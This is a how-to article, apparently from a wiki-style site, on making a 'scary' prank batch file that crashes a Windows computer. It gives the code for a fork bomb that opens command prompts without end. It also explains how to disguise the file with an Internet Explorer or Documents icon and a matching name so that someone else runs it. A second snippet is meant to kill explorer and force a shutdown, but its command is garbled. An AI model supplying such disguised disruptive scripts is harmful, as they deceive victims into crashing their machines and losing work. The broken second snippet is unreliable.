title: How to Crash a Computer with a Scary Batch File

steps.title: For Windows XP, go to Start and click All Programs.
steps.content: For Windows XP, go to Start and click All Programs. In All Programs click Accessories, in Accessories click Notepad. For Windows 7, click Start then type in the search bar at the bottom type; Notepad and press enter.

steps.title: Copy this code into Notepad:
steps.content: Copy this code into Notepad: @ echo off color a cls : top start goto top

steps.title: Save as a Batch file.
steps.content: Save as a Batch file. For example as cmd_prank.bat.

steps.title: Create a shortcut to the prank.
steps.content: Create a shortcut to the prank. Right click on the file and click Send To, then Desktop.

steps.title: Change the icon.
steps.content: Change the icon. Go to the Desktop and right click and go to Properties and Change Icon. Make the icon Internet Explorer or the Documents icon.

steps.title: Right click again and rename the file to correspond with the icon.
steps.content: Right click again and rename the file to correspond with the icon.

steps.title: When the file is double clicked, hundreds of command prompts open up and crash the monitor.
steps.content: When the file is double clicked, hundreds of command prompts open up and crash the monitor. To stop this before it happens, pull out the battery or press and hold the power key until it turns off(laptops) or unplug the computer , not the monitor (desktops).

steps.title: Open notepad and type the following code:
steps.content: Open notepad and type the following code: kill -f explorer.exe shutdown -s -f exit

steps.title: Save as a Batch file.
steps.content: Save as a Batch file. In Notepad, press Ctrl + S , then select "Any" as file type, enter a name with a ".bat" extension, for example "Anything.bat", and click on Save .
